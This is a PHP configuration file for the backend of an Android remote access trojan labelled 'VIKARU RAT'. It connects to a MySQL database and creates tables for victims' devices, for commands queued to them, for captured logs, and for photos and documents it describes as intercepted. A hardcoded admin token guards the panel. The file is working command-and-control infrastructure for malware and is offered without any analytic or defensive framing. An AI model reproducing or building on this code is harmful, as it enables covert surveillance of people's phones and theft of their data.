<?php
/**
 * VIKARU RAT - Database Configuration
 * Auto-create tables & handle connection
 */

// === HEADER ===
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Token');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// === DATABASE CONNECTION ===
function getDB() {
    $host = getenv('MYSQLHOST') ?: 'localhost';
    $port = getenv('MYSQLPORT') ?: '3306';
    $user = getenv('MYSQLUSER') ?: 'root';
    $pass = getenv('MYSQLPASSWORD') ?: '';
    $db   = getenv('MYSQLDATABASE') ?: 'railway';

    $conn = @mysqli_connect($host, $user, $pass, $db, (int)$port);

    if (!$conn) {
        http_response_code(500);
        die(json_encode([
            'error'   => 'database_connection_failed',
            'message' => mysqli_connect_error()
        ]));
    }

    mysqli_set_charset($conn, 'utf8mb4');
    return $conn;
}

// === AUTO CREATE TABLES ===
function initTables($conn) {
    $queries = [
        // Tabel victims
        "CREATE TABLE IF NOT EXISTS victims (
            id VARCHAR(100) PRIMARY KEY,
            model VARCHAR(255) DEFAULT '',
            android_version VARCHAR(50) DEFAULT '',
            ip_address VARCHAR(50) DEFAULT '',
            last_online TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            status ENUM('online','offline') DEFAULT 'online'
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4",

        // Tabel commands
        "CREATE TABLE IF NOT EXISTS commands (
            id INT AUTO_INCREMENT PRIMARY KEY,
            victim_id VARCHAR(100) NOT NULL,
            command VARCHAR(100) NOT NULL,
            parameter TEXT,
            status ENUM('pending','sent','executed') DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            INDEX idx_victim_status (victim_id, status)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4",

        // Tabel logs
        "CREATE TABLE IF NOT EXISTS logs (
            id INT AUTO_INCREMENT PRIMARY KEY,
            victim_id VARCHAR(100) NOT NULL,
            type VARCHAR(50) NOT NULL,
            data LONGTEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            INDEX idx_victim_type (victim_id, type)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4",

        // Tabel files (foto, dokumen hasil sadapan)
        "CREATE TABLE IF NOT EXISTS files (
            id INT AUTO_INCREMENT PRIMARY KEY,
            victim_id VARCHAR(100) NOT NULL,
            file_type VARCHAR(50) DEFAULT '',
            file_name VARCHAR(255) DEFAULT 'unknown',
            file_data LONGTEXT,
            uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            INDEX idx_victim (victim_id)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"
    ];

    foreach ($queries as $sql) {
        mysqli_query($conn, $sql);
    }
}

// === AUTH CHECK ===
function isAuthenticated() {
    $token = $_SERVER['HTTP_X_TOKEN'] ?? '';
    // Token: base64 dari "admin:vikaru123"
    $validToken = 'YWRtaW46dmlrYXJ1MTIz';
    return $token === $validToken;
}

function requireAuth() {
    if (!isAuthenticated()) {
        http_response_code(403);
        die(json_encode([
            'error' => 'unauthorized',
            'message' => 'Token tidak valid. Akses ditolak.'
        ]));
    }
}

// === SANITIZE ===
function sanitize($conn, $data) {
    return mysqli_real_escape_string($conn, trim($data));
}

// === INIT ===
$conn = getDB();
initTables($conn);
?>
